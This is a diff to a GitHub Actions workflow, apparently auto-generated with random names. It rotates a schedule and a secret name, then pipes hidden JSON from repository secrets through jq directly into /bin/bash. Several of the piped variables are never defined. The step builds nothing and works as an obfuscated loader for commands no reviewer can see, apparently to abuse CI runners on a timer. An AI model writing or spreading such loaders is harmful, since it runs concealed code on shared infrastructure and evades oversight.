@@ -2,19 +2,22 @@ name: zhonghutu1056
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 4/6 * * *'
+    - cron: '49 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhonghutu1056
         env:
-          a31356: ${{ secrets.a31356 }}
+          lqwk56: ${{ secrets.lqwk56 }}
         run: |
-          echo $a31356 | jq -r .thcd4 | /bin/bash
-          echo $bj7 | jq -r .eget7737 | /bin/bash
-          echo $uyxsn8250 | jq -r .nq77734 | /bin/bash
+          echo $lqwk56 | jq -r .m00 | /bin/bash
+          echo $kvnd11 | jq -r .yku1344 | /bin/bash
+          echo $x622 | jq -r .w573 | /bin/bash
+          echo $n8 | jq -r .cvqv3 | /bin/bash
+          echo $ye7283 | jq -r .iu260 | /bin/bash
+          echo $ey33106 | jq -r .kd10528 | /bin/bash
+          echo $t81401 | jq -r .smzeu56656 | /bin/bash
 
